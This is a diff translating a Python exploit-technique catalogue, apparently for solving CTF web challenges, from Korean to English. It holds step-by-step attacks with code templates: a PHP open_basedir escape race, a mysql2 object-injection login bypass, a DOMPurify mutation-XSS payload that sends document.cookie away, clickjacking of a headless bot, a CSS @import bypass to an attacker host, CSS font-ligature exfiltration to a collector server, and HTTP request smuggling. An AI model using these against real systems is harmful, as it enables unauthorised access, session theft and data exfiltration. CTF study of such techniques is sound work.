-                "`disable_functions`에 `pcntl_fork`가 빠져있으며 (pcntl extension 활성), "
-                "임의 PHP 코드 실행이 가능한 경우 (eval gate, 웹셸, 파일 업로드 등). "
-                "system/exec/popen 등 명령 실행 함수가 차단되어도 `file_get_contents`로 "
-                "open_basedir 밖의 `/flag.txt` 등을 읽을 수 있음."
+                "PHP 8.x environment where `open_basedir` is restricted to `/tmp` etc., "
+                "`pcntl_fork` is not in `disable_functions` (pcntl extension enabled), "
+                "and arbitrary PHP code execution is possible (eval gate, webshell, file upload, etc.). "
+                "Even if command execution functions (system/exec/popen) are blocked, "
+                "`file_get_contents` can read files outside open_basedir like `/flag.txt`."
             ),
             "prerequisites": [
-                "임의 PHP 코드 실행 가능 (eval, include, etc.)",
-                "pcntl_fork()가 disable_functions에서 제외됨",
-                "open_basedir이 /tmp을 포함 (mkdir/rename 가능해야 함)",
-                "ini_set('open_basedir', ...) 호출 가능 (php_admin_value가 아닌 경우)",
+                "Arbitrary PHP code execution possible (eval, include, etc.)",
+                "pcntl_fork() is not in disable_functions",
+                "open_basedir includes /tmp (mkdir/rename must be available)",
+                "ini_set('open_basedir', ...) callable (not set via php_admin_value)",
             ],
             "technique_steps_md": (
                 "1. `chdir('/tmp')` → `mkdir('start/')` → `chdir('start/')`\n"
-                "2. `str_repeat('a' * 249 . '/', N)` 으로 경로 길이가 4096(MAXPATHLEN) 직전이 되는 "
-                "깊은 디렉터리 생성 후 `chdir`\n"
-                "3. `pcntl_fork()` — child와 parent로 분기\n"
-                "4. **Child**: 반복적으로 `ini_set('open_basedir', $cur . ':../')` 시도. "
-                "parent가 rename으로 경로를 4096 이상으로 만들면 `getcwd()` 실패 → "
-                "`expand_filepath('../')` 가 `VCWD_OPEN('../')` fallback → `../` 그대로 반환 → "
-                "open_basedir에 `../` 추가 성공\n"
-                "5. **Parent**: `/tmp/start`를 `/tmp/xxxxxx...(250자)`로 rename ↔ 원복 반복 "
-                "(경로 길이를 4096 경계에서 토글)\n"
-                "6. Child: race 성공 후 `chdir('/tmp'); chdir('../')` → open_basedir 탈출\n"
-                "7. `file_get_contents('/flag.txt')` 로 flag 읽기"
+                "2. Create deep directory with `str_repeat('a' * 249 . '/', N)` so the path length is "
+                "just below 4096 (MAXPATHLEN), then `chdir` into it\n"
+                "3. `pcntl_fork()` — split into child and parent\n"
+                "4. **Child**: repeatedly attempts `ini_set('open_basedir', $cur . ':../')`. "
+                "When parent renames the path to exceed 4096, `getcwd()` fails → "
+                "`expand_filepath('../')` falls back to `VCWD_OPEN('../')` → returns `../` as-is → "
+                "successfully adds `../` to open_basedir\n"
+                "5. **Parent**: renames `/tmp/start` to `/tmp/xxxxxx...(250 chars)` and back repeatedly "
+                "(toggles path length across the 4096 boundary)\n"
+                "6. Child: after race succeeds, `chdir('/tmp'); chdir('../')` → escapes open_basedir\n"
+                "7. `file_get_contents('/flag.txt')` to read the flag"
             ),
             "code_template": (
                 "chdir('/tmp');\n"
@@ -600,23 +601,23 @@ TECHNIQUES: list[dict] = [
                 {
                     "params": {
                         "open_basedir": "/var/www/html:/tmp",
-                        "disabled_functions": "system,exec,shell_exec,popen,proc_open,passthru,... (pcntl_fork 제외)",
+                        "disabled_functions": "system,exec,shell_exec,popen,proc_open,passthru,... (pcntl_fork excluded)",
                         "flag_path": "/flag.txt",
                         "eval_gate": "?key=KEY&code=<php_code>",
-                        "race_success_rate": "첫 시도 성공률 높음",
+                        "race_success_rate": "high success rate on first attempt",
                     },
                     "notes": (
-                        "PHP 8.4-cli 대상. expand_filepath()의 VCWD_GETCWD → getcwd() 가 "
-                        "MAXPATHLEN(4096) 초과 시 실패, fallback으로 VCWD_OPEN(filepath)이 "
-                        "성공하면 filepath를 realpath로 그대로 반환하는 버그. "
-                        "이를 race condition으로 trigger."
+                        "Targets PHP 8.4-cli. Bug in expand_filepath(): VCWD_GETCWD → getcwd() "
+                        "fails when exceeding MAXPATHLEN(4096), fallback VCWD_OPEN(filepath) "
+                        "succeeds and returns filepath as realpath as-is. "
+                        "Triggered via race condition."
                     ),
                 },
             ],
             "tags": ["php", "open-basedir", "race-condition", "pcntl-fork", "sandbox-escape"],
         },
     },
-    # ── Auth bypass / XSS chain techniques ──
+    # ── Auth bypass / XSS chain techniques ─────────────────────
     {
         "name": "mysql_object_injection_auth_bypass",
         "vuln_type": "sqli",
@@ -627,31 +628,31 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "MySQL object injection auth bypass — JSON object as parameterized query value",
             "applies_when": (
-                "Node.js 앱에서 mysql/mysql2 드라이버로 parameterized query를 사용하지만, "
-                "사용자 입력(req.body.password 등)의 타입을 검증하지 않아 JSON 객체를 그대로 전달하는 경우. "
-                "Express의 express.json() 미들웨어가 활성화되어 있으면 "
-                "{ \"password\": { \"password\": 1 } } 같은 중첩 객체가 파싱됨."
+                "A Node.js app uses mysql/mysql2 driver with parameterized queries but does not "
+                "validate the type of user input (req.body.password, etc.), allowing JSON objects to be "
+                "passed directly. With Express's express.json() middleware enabled, nested objects like "
+                "{ \"password\": { \"password\": 1 } } are parsed as-is."
             ),
             "prerequisites": [
-                "Node.js + mysql/mysql2 드라이버 사용",
-                "express.json() 미들웨어 활성 (Content-Type: application/json)",
-                "parameterized query에 사용자 입력을 타입 검증 없이 전달",
-                "SELECT * FROM users WHERE username = ? AND password = ? 같은 쿼리",
+                "Node.js + mysql/mysql2 driver in use",
+                "express.json() middleware enabled (Content-Type: application/json)",
+                "User input passed to parameterized query without type validation",
+                "Query like SELECT * FROM users WHERE username = ? AND password = ?",
             ],
             "technique_steps_md": (
-                "1. 타겟 로그인 엔드포인트 확인: `POST /auth/login` + `Content-Type: application/json`\n"
-                "2. 비밀번호 필드에 객체 전달: `{\"username\": \"admin\", \"password\": {\"password\": 1}}`\n"
-                "3. mysql2 드라이버가 객체를 `` `password` = 1 ``로 serialize\n"
-                "4. 최종 SQL: `WHERE username = 'admin' AND password = \\`password\\` = 1`\n"
-                "5. `password = \\`password\\`` → 컬럼 자기 자신 비교 → 항상 1(true)\n"
-                "6. `1 = 1` → true → 인증 우회 성공"
+                "1. Identify target login endpoint: `POST /auth/login` + `Content-Type: application/json`\n"
+                "2. Pass object in password field: `{\"username\": \"admin\", \"password\": {\"password\": 1}}`\n"
+                "3. mysql2 driver serializes the object to `` `password` = 1 ``\n"
+                "4. Final SQL: `WHERE username = 'admin' AND password = \\`password\\` = 1`\n"
+                "5. `password = \\`password\\`` → column compared to itself → always 1 (true)\n"
+                "6. `1 = 1` → true → authentication bypass successful"
             ),
             "code_template": (
                 "import requests\n"
                 "r = requests.post('{url}/auth/login',\n"
                 "    json={'username': '{target_user}', 'password': {'password': 1}})\n"
                 "token = r.json().get('token')\n"
-                "# token으로 admin 기능 접근 가능"
+                "# use token to access admin functionality"
             ),
             "examples": [
                 {
@@ -661,10 +662,10 @@ TECHNIQUES: list[dict] = [
                         "payload": '{"username": "admin", "password": {"password": 1}}',
                     },
                     "notes": (
-                        "mysql2 드라이버는 객체를 `col = val` 형태로 직렬화. "
-                        "password = `password` = 1 은 (password = password) = 1 → 1 = 1 → true. "
-                        "이 기법은 parameterized query를 사용해도 우회 가능하므로 "
-                        "typeof 검증이나 입력 스키마 검증이 필수."
+                        "mysql2 driver serializes objects to `col = val` form. "
+                        "password = `password` = 1 becomes (password = password) = 1 → 1 = 1 → true. "
+                        "This technique bypasses even parameterized queries, so "
+                        "typeof validation or input schema validation is essential."
                     ),
                 },
             ],
@@ -681,25 +682,24 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "DOMPurify mXSS bypass via custom elements + SAFE_FOR_TEMPLATES config",
             "applies_when": (
-                "DOMPurify가 SAFE_FOR_TEMPLATES: true 및 CUSTOM_ELEMENT_HANDLING "
-                "(tagNameCheck: /^custom-/) 설정으로 사용되는 경우. "
-                "sanitize된 HTML이 innerHTML에 할당될 때 DOM mutation으로 "
-                "이벤트 핸들러가 살아남을 수 있음."
+                "DOMPurify is configured with SAFE_FOR_TEMPLATES: true and CUSTOM_ELEMENT_HANDLING "
+                "(tagNameCheck: /^custom-/). When sanitized HTML is assigned to innerHTML, "
+                "DOM mutation can cause event handlers to survive."
             ),
             "prerequisites": [
                 "DOMPurify with SAFE_FOR_TEMPLATES: true",
                 "CUSTOM_ELEMENT_HANDLING with tagNameCheck for custom- prefix",
-                "sanitize 결과가 innerHTML에 할당됨",
-                "CSP가 inline script/event handler를 허용 (unsafe-inline 등)",
+                "Sanitize output is assigned to innerHTML",
+                "CSP allows inline script/event handlers (unsafe-inline, etc.)",
             ],
             "technique_steps_md": (
-                "1. DOMPurify 설정 확인: `SAFE_FOR_TEMPLATES`, `CUSTOM_ELEMENT_HANDLING`\n"
-                "2. mutation XSS payload 구성: `<math>`, `<table>`, `<custom-*>` 태그를 조합하여 "
-                "DOM 파싱 시 구조 변경을 유도\n"
-                "3. `<style>` 태그 내부에 `<! \\${` 같은 template 구문으로 파서 혼동\n"
-                "4. `<custom-b id=\">...\">` 같은 형태로 attribute 안에 event handler 삽입\n"
-                "5. sanitize 후 innerHTML 할당 시 DOM reparse → `<img onerror=...>` 활성화\n"
-                "6. XSS 실행: `location.href='...' + document.cookie`"
+                "1. Check DOMPurify config: `SAFE_FOR_TEMPLATES`, `CUSTOM_ELEMENT_HANDLING`\n"
+                "2. Construct mutation XSS payload: combine `<math>`, `<table>`, `<custom-*>` tags to "
+                "induce structural changes during DOM parsing\n"
+                "3. Use template syntax like `<! \\${` inside `<style>` tag to confuse the parser\n"
+                "4. Insert event handler inside attribute via `<custom-b id=\">...\">` form\n"
+                "5. After sanitize, innerHTML assignment triggers DOM reparse → `<img onerror=...>` activates\n"
+                "6. XSS fires: `location.href='...' + document.cookie`"
             ),
             "code_template": (
                 '<math><custom-test><mi><li><table><custom-test><li></li></custom-test>'
@@ -715,10 +715,10 @@ TECHNIQUES: list[dict] = [
                         "delivery": "base64 encoded in URL query parameter",
                     },
                     "notes": (
-                        "DOMPurify의 SAFE_FOR_TEMPLATES 모드에서 custom element 허용 시 "
-                        "math/table 컨텍스트 전환과 style 태그를 결합한 mutation XSS가 가능. "
-                        "서버 사이드에서 sanitize한 HTML을 클라이언트에서 innerHTML로 "
-                        "다시 파싱하면 DOM 구조가 달라져 이벤트 핸들러가 활성화됨."
+                        "When DOMPurify's SAFE_FOR_TEMPLATES mode allows custom elements, "
+                        "mutation XSS is possible by combining math/table context switching with style tags. "
+                        "When server-side sanitized HTML is re-parsed via innerHTML on the client, "
+                        "the DOM structure changes and event handlers become active."
                     ),
                 },
             ],
@@ -735,31 +735,31 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "CSP split-brain — unsafe-inline on admin routes enables XSS execution",
             "applies_when": (
-                "웹앱이 경로별로 다른 CSP 정책을 적용하고, admin 경로에 "
-                "script-src 'unsafe-inline'이 설정된 경우. public 페이지에서는 "
-                "nonce 기반 CSP로 XSS가 차단되지만, admin 페이지로 리다이렉트하면 실행 가능."
+                "The web app applies different CSP policies per route, and admin routes have "
+                "script-src 'unsafe-inline'. XSS is blocked on public pages via nonce-based CSP, "
+                "but becomes executable when redirected to admin pages."
             ),
             "prerequisites": [
-                "admin 경로: script-src 'self' 'unsafe-inline'",
-                "public 경로: script-src 'nonce-...'",
-                "admin 페이지에 사용자 입력을 반영하는 sink (innerHTML 등)이 존재",
-                "사용자를 admin 페이지로 유도할 수 있는 방법 (form submit, redirect 등)",
+                "Admin route: script-src 'self' 'unsafe-inline'",
+                "Public route: script-src 'nonce-...'",
+                "Admin page has a sink that reflects user input (innerHTML, etc.)",
+                "A way to direct users to the admin page (form submit, redirect, etc.)",
             ],
             "technique_steps_md": (
-                "1. CSP 헤더 분석: `req.path.startsWith('/admin')` → unsafe-inline\n"
-                "2. public 페이지에서는 XSS payload가 CSP에 의해 차단됨을 확인\n"
-                "3. admin 페이지에 사용자 입력을 받는 sink 찾기 (innerHTML, eval 등)\n"
-                "4. public 페이지의 stored content에 admin 페이지로의 form/redirect 삽입\n"
-                "5. 피해자(bot)가 admin 페이지를 방문하면 unsafe-inline CSP 하에서 XSS 실행"
+                "1. Analyze CSP headers: `req.path.startsWith('/admin')` → unsafe-inline\n"
+                "2. Confirm XSS payload is blocked by CSP on public pages\n"
+                "3. Find a sink on admin pages that accepts user input (innerHTML, eval, etc.)\n"
+                "4. Insert form/redirect to admin page in stored content on public pages\n"
+                "5. When victim (bot) visits admin page, XSS executes under unsafe-inline CSP"
             ),
             "code_template": (
-                "// Express middleware CSP 설정 (취약 패턴)\n"
+                "// Express middleware CSP config (vulnerable pattern)\n"
                 "if (req.path.startsWith('/admin')) {\n"
                 "  res.setHeader('CSP', \"script-src 'self' 'unsafe-inline'\");\n"
                 "} else {\n"
                 "  res.setHeader('CSP', `script-src 'nonce-${nonce}'`);\n"
                 "}\n"
-                "// admin 페이지에서 innerHTML = userInput → XSS 가능"
+                "// innerHTML = userInput on admin page → XSS possible"
             ),
             "examples": [
                 {
@@ -783,22 +783,22 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "EJS theme path traversal — CSS file include via ../ in theme parameter",
             "applies_when": (
-                "EJS (또는 유사 템플릿)에서 사용자 제어 가능한 theme 값이 "
-                "CSS 경로에 직접 삽입되는 경우. "
-                "`<link href=\"/css/theme/<%= theme %>.css\">` 같은 패턴에서 "
-                "`theme: \"../switch\"`로 다른 CSS 파일을 로드할 수 있음."
+                "In EJS (or similar template engine), a user-controllable theme value is "
+                "directly inserted into the CSS path. "
+                "In a pattern like `<link href=\"/css/theme/<%= theme %>.css\">`, "
+                "setting `theme: \"../switch\"` loads a different CSS file."
             ),
             "prerequisites": [
-                "theme 파라미터가 DB에 저장되거나 URL에서 직접 반영",
-                "서버 사이드 검증 없이 CSS 경로에 삽입",
-                "로드할 수 있는 대체 CSS 파일이 존재 (static 디렉터리 내)",
+                "Theme parameter is stored in DB or directly reflected from URL",
+                "Inserted into CSS path without server-side validation",
+                "An alternative CSS file exists that can be loaded (within static directory)",
             ],
             "technique_steps_md": (
-                "1. 게시글 작성 시 theme 필드에 `../switch` 입력 (서버 검증 없음)\n"
-                "2. 렌더링 시 `<link href=\"/css/theme/../switch.css\">` → `/css/switch.css` 로드\n"
-                "3. switch.css의 `.slider` 클래스가 absolute positioning 제공\n"
-                "4. 게시글 content에 `.slider` 클래스를 가진 submit 버튼 삽입\n"
-                "5. 기존 UI 요소(#delete 등) 위에 오버레이 → 클릭 하이재킹"
+                "1. Enter `../switch` in the theme field when creating a post (no server validation)\n"
+                "2. On render: `<link href=\"/css/theme/../switch.css\">` → loads `/css/switch.css`\n"
+                "3. switch.css provides absolute positioning via `.slider` class\n"
+                "4. Insert a submit button with `.slider` class into post content\n"
+                "5. Overlay on top of existing UI elements (#delete, etc.) → click hijacking"
             ),
             "code_template": (
                 "requests.post('{url}/post/write', json={\n"
@@ -832,23 +832,23 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "Headless bot click hijacking via CSS absolute position overlay",
             "applies_when": (
-                "CTF 또는 웹앱에서 headless browser (Puppeteer 등)가 특정 페이지를 방문하고 "
-                "특정 요소(#delete 등)를 클릭하는 봇이 있을 때. "
-                "사용자 제어 가능한 HTML/CSS로 클릭 대상 위에 다른 요소를 오버레이하여 "
-                "봇의 클릭을 다른 동작(form submit 등)으로 하이재킹."
+                "A CTF or web app has a headless browser bot (Puppeteer, etc.) that visits a page "
+                "and clicks a specific element (#delete, etc.). User-controllable HTML/CSS can overlay "
+                "another element on top of the click target, hijacking the bot's click to perform "
+                "a different action (form submit, etc.)."
             ),
             "prerequisites": [
-                "headless browser 봇이 페이지 방문 후 특정 요소 클릭",
-                "사용자가 HTML content에 form/button 삽입 가능",
-                "CSS로 absolute/fixed positioning 사용 가능 (theme traversal, inline style 등)",
-                "봇이 인증된 세션(cookie)으로 방문",
+                "Headless browser bot visits a page and clicks a specific element",
+                "User can insert form/button into HTML content",
+                "CSS absolute/fixed positioning is available (theme traversal, inline style, etc.)",
+                "Bot visits with an authenticated session (cookie)",
             ],
             "technique_steps_md": (
-                "1. 봇의 행동 분석: `page.$('#delete').click()` 등\n"
-                "2. 사용자 content에 `<form action=\"/target\">` + `<button class=\"slider\">` 삽입\n"
-                "3. CSS (.slider)가 position: absolute + width/height: 100%로 전체 영역 커버\n"
-                "4. 봇이 #delete 클릭 시도 → 실제로는 .slider submit 버튼 클릭\n"
-                "5. form이 인증된 세션으로 /target 페이지에 GET 요청 → 공격자 payload 전달"
+                "1. Analyze bot behavior: `page.$('#delete').click()` etc.\n"
+                "2. Insert `<form action=\"/target\">` + `<button class=\"slider\">` into user content\n"
+                "3. CSS (.slider) covers entire area with position: absolute + width/height: 100%\n"
+                "4. Bot attempts to click #delete → actually clicks .slider submit button\n"
+                "5. Form sends GET request to /target with authenticated session → delivers attacker payload"
             ),
             "code_template": (
                 "<!-- Post content with clickjack overlay -->\n"
@@ -872,7 +872,7 @@ TECHNIQUES: list[dict] = [
             "tags": ["clickjacking", "headless-browser", "puppeteer", "css", "bot", "ui-redress"],
         },
     },
-    # ── CSS side-channel techniques ──
+    # ── CSS side-channel techniques ──────────────────────────────
     {
         "name": "css_import_escape_url_filter_bypass",
         "vuln_type": "xss",
@@ -883,20 +883,20 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "CSS @import remote URL filter bypass via CSS escape sequences",
             "applies_when": (
-                "클라이언트 JS가 <style> 블록 내 원격 URL(http://, //)을 탐지하여 차단하지만, "
-                "CSS 이스케이프 시퀀스(\\3a = ':', \\2f = '/')를 사용하면 JS 정규식을 우회하면서 "
-                "브라우저는 정상적으로 URL을 파싱하여 외부 리소스를 로드하는 경우."
+                "Client-side JS detects and blocks remote URLs (http://, //) inside <style> blocks, "
+                "but CSS escape sequences (\\3a = ':', \\2f = '/') bypass the JS regex while the "
+                "browser correctly parses and loads the external resource URL."
             ),
             "prerequisites": [
-                "게시글 등에 <style> 태그 삽입 가능",
-                "클라이언트 JS가 CSS 내 원격 URL을 정규식으로 필터링",
-                "서버 사이드에서 <style> 태그 자체는 허용 (DOMPurify에서 제거하지 않거나 별도 처리)",
+                "<style> tag injection possible (e.g. in posts)",
+                "Client-side JS filters remote URLs in CSS via regex",
+                "Server-side allows <style> tags (not removed by DOMPurify or handled separately)",
             ],
             "technique_steps_md": (
-                "1. JS 필터 분석: `/\\b(?:https?|data)\\s*:/i.test(css)` 또는 `css.includes('//')`\n"
-                "2. CSS 이스케이프로 우회: `http\\3a \\2f \\2f attacker\\2f style.css`\n"
-                "3. `@import` 규칙으로 외부 CSS 로드: `<style>@import 'http\\3a \\2f \\2f ...';</style>`\n"
-                "4. 브라우저가 이스케이프를 디코딩하여 정상 URL로 요청"
+                "1. Analyze JS filter: `/\\b(?:https?|data)\\s*:/i.test(css)` or `css.includes('//')`\n"
+                "2. Bypass via CSS escape: `http\\3a \\2f \\2f attacker\\2f style.css`\n"
+                "3. Load external CSS with `@import` rule: `<style>@import 'http\\3a \\2f \\2f ...';</style>`\n"
+                "4. Browser decodes escapes and requests the URL normally"
             ),
             "code_template": (
                 "def css_escape_url(url):\n"
@@ -928,43 +928,43 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "Firefox content-visibility:hidden bug — checkVisibility()=false but layout still works",
             "applies_when": (
-                "웹앱이 JavaScript로 `element.checkVisibility()`를 사용하여 "
-                "CSS로 표시된 요소를 감지하고 제거하는 방어를 구현한 경우. "
-                "Firefox ESR 140.0의 버그로 `content-visibility:hidden`이 적용되면 "
-                "`checkVisibility()`는 false를 반환하지만(방어 우회), "
-                "내부 flex/grid layout, 폰트 로딩, container query, background-image 로딩은 "
-                "정상 동작하여 CSS-only 공격이 가능."
+                "The web app implements a defense using JavaScript `element.checkVisibility()` to "
+                "detect and remove CSS-displayed elements. "
+                "A Firefox ESR 140.0 bug causes `content-visibility:hidden` to make "
+                "`checkVisibility()` return false (bypassing the defense), while "
+                "internal flex/grid layout, font loading, container queries, and background-image "
+                "loading still work normally, enabling CSS-only attacks."
             ),
             "prerequisites": [
-                "Firefox ESR 140.0 (또는 해당 버그가 있는 버전)",
-                "JS 방어가 checkVisibility()에 의존",
-                "공격자가 CSS를 통해 content-visibility:hidden 설정 가능",
-                "내부 레이아웃이나 리소스 로딩을 통한 side-channel 필요",
+                "Firefox ESR 140.0 (or version with this bug)",
+                "JS defense relies on checkVisibility()",
+                "Attacker can set content-visibility:hidden via CSS injection",
+                "Side-channel via internal layout or resource loading required",
             ],
             "technique_steps_md": (
-                "1. JS 방어 분석: `f.checkVisibility()` → true이면 `f.remove()`\n"
-                "2. CSS 주입: `#page { content-visibility: hidden !important; }`\n"
-                "3. `checkVisibility()` → false 반환 (방어 우회)\n"
-                "4. Firefox 버그: 내부 layout은 여전히 동작\n"
-                "5. flex layout + font ligature + container query로 side-channel 실행\n"
-                "6. 참고: https://bugzilla.mozilla.org/show_bug.cgi?id=2025174"
+                "1. Analyze JS defense: `f.checkVisibility()` → if true, `f.remove()`\n"
+                "2. CSS injection: `#page { content-visibility: hidden !important; }`\n"
+                "3. `checkVisibility()` → returns false (defense bypassed)\n"
+                "4. Firefox bug: internal layout still works\n"
+                "5. Execute side-channel via flex layout + font ligature + container query\n"
+                "6. Ref: https://bugzilla.mozilla.org/show_bug.cgi?id=2025174"
             ),
             "code_template": (
                 "#page {\n"
                 "  content-visibility: hidden !important;\n"
                 "  display: flex !important;\n"
-                "  /* 내부 layout은 Firefox 버그로 여전히 동작 */\n"
+                "  /* internal layout still works due to Firefox bug */\n"
                 "}\n"
                 "#flag {\n"
                 "  display: block !important;\n"
-                "  /* checkVisibility()=false이므로 JS가 제거하지 않음 */\n"
+                "  /* checkVisibility()=false so JS does not remove it */\n"
                 "}"
             ),
             "examples": [{
                 "params": {
                     "browser": "Firefox ESR 140.0 (headless)",
                     "bug_url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2025174",
-                    "defense": "setInterval(check, 50) + MutationObserver — checkVisibility() 기반",
+                    "defense": "setInterval(check, 50) + MutationObserver — checkVisibility() based",
                     "bypassed_checks": ["display !== none", "checkVisibility() === true"],
                 },
             }],
@@ -981,35 +981,35 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "CSS font ligature width side-channel — character-by-character data exfiltration",
             "applies_when": (
-                "비밀 텍스트가 DOM에 존재하고, 공격자가 CSS를 주입하여 해당 요소에 "
-                "커스텀 폰트를 적용할 수 있는 경우. JavaScript 실행 없이 CSS만으로 "
-                "텍스트 내용을 한 글자씩 외부로 유출할 수 있음."
+                "Secret text exists in the DOM and the attacker can inject CSS to apply a "
+                "custom font to that element. Text content can be exfiltrated one character at a "
+                "time using CSS only, without JavaScript execution."
             ),
             "prerequisites": [
-                "비밀 텍스트가 DOM 요소에 존재 (예: flag div)",
-                "CSS 주입 가능 (style 태그 또는 @import)",
-                "브라우저가 외부 폰트 로딩 + container query 지원",
-                "외부 collector 서버 필요 (폰트/CSS 제공 + hit 수집)",
+                "Secret text exists in a DOM element (e.g. flag div)",
+                "CSS injection possible (style tag or @import)",
+                "Browser supports external font loading + container queries",
+                "External collector server needed (serves fonts/CSS + collects hits)",
             ],
             "technique_steps_md": (
-                "1. **커스텀 폰트 생성**: fonttools로 ligature 폰트 빌드\n"
-                "   - 이미 알려진 prefix + 각 후보 문자 → 서로 다른 폭의 glyph로 매핑\n"
-                "   - 예: `known_prefix{` + `a` → width 1, `known_prefix{` + `b` → width 2, ...\n"
-                "2. **CSS 레이아웃 구성**: flex container + container query\n"
-                "   - `#page` = flex row, 고정 width\n"
-                "   - `#flag` = flex: 0 0 auto (텍스트 폭만큼 차지)\n"
-                "   - `.spacer` = flex: 1 1 auto + container-type: size (남는 공간)\n"
-                "3. **Container Query oracle**: spacer 폭에 따라 다른 background-image URL\n"
+                "1. **Build custom font**: use fonttools to build a ligature font\n"
+                "   - Known prefix + each candidate character → mapped to glyphs with different widths\n"
+                "   - e.g.: `known_prefix{` + `a` → width 1, `known_prefix{` + `b` → width 2, ...\n"
+                "2. **CSS layout setup**: flex container + container query\n"
+                "   - `#page` = flex row, fixed width\n"
+                "   - `#flag` = flex: 0 0 auto (takes up text width)\n"
+                "   - `.spacer` = flex: 1 1 auto + container-type: size (remaining space)\n"
+                "3. **Container Query oracle**: different background-image URL based on spacer width\n"
                 "   - `@container (width: Npx) { .spacer::before { background-image: url(.../hit?c=X); } }`\n"
-                "4. **한 글자 유출**: 브라우저가 조건에 맞는 URL만 로드 → collector에 문자 전달\n"
-                "5. **반복**: prefix 업데이트 → 새 폰트/CSS 생성 → 다음 글자 유출"
+                "4. **Exfiltrate one character**: browser loads only the matching URL → character sent to collector\n"
+                "5. **Repeat**: update prefix → generate new font/CSS → exfiltrate next character"
             ),
             "code_template": (
-                "# Font 생성 (fonttools)\n"
+                "# Font generation (fonttools)\n"
                 "fb = FontBuilder(1000, isTTF=True)\n"
-                "# 각 후보 문자에 대해 다른 폭의 ligature glyph 생성\n"
+                "# generate ligature glyph with different width for each candidate character\n"
                 "for i, ch in enumerate(candidates):\n"
-                "    metrics[lig_name(i)] = (i + 1, 0)  # 폭 = index+1\n"
+                "    metrics[lig_name(i)] = (i + 1, 0)  # width = index+1\n"
                 "# OpenType feature: sub prefix_glyphs candidate_glyph by lig_glyph\n"
                 "fea = 'sub ' + ' '.join(glyph_name(c) for c in prefix) + ' ' + glyph_name(ch) + ' by ' + lig_name(i)\n"
                 "\n"
@@ -1026,15 +1026,15 @@ TECHNIQUES: list[dict] = [
                     "success_rate": "~80% per attempt, 5 retries",
                 },
                 "notes": (
-                    "Firefox ESR에서 content-visibility:hidden 버그와 결합. "
-                    "JS 방어(checkVisibility)를 우회하면서 font ligature side-channel 실행. "
-                    "로컬 검증에서 5글자 연속 유출 성공."
+                    "Combined with the Firefox ESR content-visibility:hidden bug. "
+                    "Bypasses JS defense (checkVisibility) while executing font ligature side-channel. "
+                    "5 consecutive characters exfiltrated successfully in local testing."
                 ),
             }],
             "tags": ["css", "font", "ligature", "side-channel", "exfiltration", "container-query", "fonttools"],
         },
     },
-    # ── HTTP smuggling / protocol confusion techniques ──
+    # ── HTTP smuggling / protocol confusion techniques ──────────
     {
         "name": "safe_strlen_content_length_desync",
         "vuln_type": "http_request_smuggling",
@@ -1045,23 +1045,23 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "safe_strlen Content-Length desync — HTTP request smuggling via control character truncation",
             "applies_when": (
-                "PHP 앱에서 Content-Length를 직접 계산하되 ctype_cntrl($c) → 즉시 return하는 "
-                "safe_strlen 류 함수를 사용. 실제 body 길이와 safe_strlen 결과가 불일치하면 "
-                "backend에 second request를 smuggle할 수 있다."
+                "A PHP app computes Content-Length using a safe_strlen-style function that returns "
+                "immediately on ctype_cntrl($c). When the actual body length differs from safe_strlen's "
+                "result, a second request can be smuggled to the backend."
             ),
             "prerequisites": [
-                "PHP safe_strlen: for-loop + ctype_cntrl → return $len (control char에서 조기 종료)",
-                "PHP가 curl로 backend에 request를 forward — keep-alive connection",
-                "backend (Node.js 등)가 실제 Content-Length 기준으로 body를 읽어 남는 bytes가 다음 request",
+                "PHP safe_strlen: for-loop + ctype_cntrl → return $len (early termination on control char)",
+                "PHP forwards requests to backend via curl — keep-alive connection",
+                "Backend (Node.js, etc.) reads body based on actual Content-Length, leaving remaining bytes as next request",
             ],
             "technique_steps_md": (
-                "1. `safe_strlen` 분석 — control char (\\x00-\\x1f) 첫 등장에서 길이를 잘라내는지 확인\n"
-                "2. 실제 body 구성: `VISIBLE_PART + \\r + SMUGGLED_HTTP_REQUEST`\n"
-                "   → safe_strlen은 `len(VISIBLE_PART)` 반환, 실제 전송은 전체 길이\n"
-                "3. PHP가 `Content-Length: safe_strlen(body)` 로 backend에 POST 전송 (keep-alive)\n"
-                "4. backend는 VISIBLE_PART 만 첫 request body로 읽고, \n"
-                "   남은 `\\r + SMUGGLED_HTTP_REQUEST`를 새 request로 파싱\n"
-                "5. smuggled request에 원하는 endpoint/header/body를 넣어 임의 동작 수행"
+                "1. Analyze `safe_strlen` — check if it truncates length at first control char (\\x00-\\x1f)\n"
+                "2. Construct actual body: `VISIBLE_PART + \\r + SMUGGLED_HTTP_REQUEST`\n"
+                "   → safe_strlen returns `len(VISIBLE_PART)`, but actual transmission is the full length\n"
+                "3. PHP sends POST to backend with `Content-Length: safe_strlen(body)` (keep-alive)\n"
+                "4. Backend reads only VISIBLE_PART as the first request body,\n"
+                "   remaining `\\r + SMUGGLED_HTTP_REQUEST` is parsed as a new request\n"
+                "5. Insert desired endpoint/header/body into smuggled request for arbitrary actions"
             ),
             "code_template": (
                 "visible = b'action=healthcheck'\n"
@@ -1082,8 +1082,8 @@ TECHNIQUES: list[dict] = [
                     "smuggled_action": "POST /set/:key/:value",
                 },
                 "notes": (
-                    "input sanitization이 없는 경우 smuggling 없이도 풀 수 있지만, "
-                    "danger() 류 필터가 있으면 CL desync가 필수."
+                    "Solvable without smuggling if there's no input sanitization, "
+                    "but CL desync is required when danger()-style filters are present."
                 ),
             }, {
                 "params": {
@@ -1092,8 +1092,8 @@ TECHNIQUES: list[dict] = [
                     "smuggled_action": "POST /set/:key/:value — input filter bypass",
                 },
                 "notes": (
-                    "danger() 류 함수가 pipe(|)/null/newline을 필터하므로 "
-                    "직접 URL에 command injection 불가 → CL desync로 우회."
+                    "danger()-style function filters pipe(|)/null/newline, so "
+                    "direct command injection in URL is not possible → bypass via CL desync."
                 ),
             }],
             "tags": ["smuggling", "content-length", "desync", "php", "safe_strlen", "control-char", "keep-alive"],
